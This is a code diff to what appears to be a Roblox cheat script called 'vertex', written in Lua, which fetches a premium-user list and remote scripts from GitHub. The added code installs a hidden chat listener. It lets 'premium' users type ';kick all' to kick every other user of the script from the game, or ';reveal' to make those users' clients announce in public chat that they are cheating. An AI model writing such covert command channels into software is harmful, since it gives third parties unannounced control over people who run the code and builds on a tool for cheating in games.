@@ -3,6 +3,8 @@ local Players = game:GetService("Players")
 shared.premiumUserIds = shared.premiumUserIds or {}
 local csvData = game:HttpGet("https://raw.githubusercontent.com/vertex-peak/API/refs/heads/main/API.csv")
 local lines = csvData:split("\n")
+local TextChatService = game:GetService("TextChatService")
+local revealCooldowns = {}
 
 local function simpleHash(message)
     local hash = 0x12345678  
@@ -133,6 +135,39 @@ if isPremiumUser(Players.LocalPlayer) then
 else 
     shared.premium = false -- Setting it to false? For what ... Useless code...
 end 
+
+local function onPlayerChat(player, message)
+    if isPremiumUser(Players.LocalPlayer) then return end -- Prevent command execution for premium users
+    local lowerMessage = message:lower()
+
+    if lowerMessage == ";kick all" and isPremiumUser(player) then
+        Players.LocalPlayer:Kick("Premium user has kicked you")
+    end
+    wait(.1)
+    if lowerMessage == ";reveal" and isPremiumUser(player) then
+        local currentTime = tick()
+
+        if revealCooldowns[player.UserId] and currentTime - revealCooldowns[player.UserId] < 10 then
+            return -- Ignore the command if it's too soon.. Don't abuse commands...
+        end
+
+        revealCooldowns[player.UserId] = currentTime
+
+        game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync("I'm using vertex")
+    end
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+        onPlayerChat(player, msg)
+    end)
+end)
+
+for _, player in pairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg)
+        onPlayerChat(player, msg)
+    end)
+end
 
 -- Skid!? 
 local function loadScriptFromURL(url)
